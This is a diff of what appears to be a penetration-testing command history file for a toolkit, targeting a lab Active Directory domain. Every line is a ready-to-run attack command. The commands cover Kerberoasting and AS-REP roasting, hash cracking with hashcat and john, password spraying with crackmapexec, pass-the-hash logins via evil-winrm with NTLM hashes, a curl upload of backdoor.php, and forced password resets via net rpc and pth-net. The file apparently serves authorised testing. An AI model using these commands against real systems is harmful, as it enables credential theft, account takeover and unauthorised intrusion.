@@ -108,7 +108,7 @@ hashcat -m 18200 -a 0 ASREProastables.txt `fzf-wordlists`
 john --wordlist=`fzf-wordlists` ASREProastables.txt
 GetUserSPNs.py -outputfile Kerberoastables.txt BREAKING.BAD/anonymous:anonymous
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
-hashcat -m 13100 `fzf-wordlists` kerberoastables.txt
+hashcat -m 13100 kerberoastables.txt `fzf-wordlists`
 john --format=krb5tgs --wordlist=`fzf-wordlists` kerberoastables.txt
 polenum -u anonymous -p anonymous -d BREAKING.BAD
 cme smb 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --pass-pol
@@ -151,6 +151,8 @@ wfuzz --hh 185 -c -w `fzf-wordlists` -H "Host: FUZZ.org" -u http://192.168.10.10
 evil-winrm -u serviceaccount -p P4ssw0rd -i 192.168.56.101
 evil-winrm -u serviceaccount -H c1c635aa12ae60b7fe39e28456a7bac6 -i 192.168.56.101
 cme smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
+cme smb 192.168.56.101 --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+crackmapexec smb 192.168.56.101 --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 crackmapexec smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
 smbpasswd -U BREAKING/serviceaccount -r 192.168.56.101
 enum4linux-ng -A 192.168.59.101
@@ -160,3 +162,6 @@ nmap -sS -p 3268,3269 192.168.56.0/24
 nmap -sC -sV -p 139,445,80,21 192.168.56.201
 nmap -Pn -v -sS -F 192.168.56.0/24
 curl http://192.168.10.10/ --upload-file backdoor.php -v
+net rpc password someuser -U BREAKING/anotheruser%'P@ssword' -S DC01.BREAKING.BAD
+net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
+pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
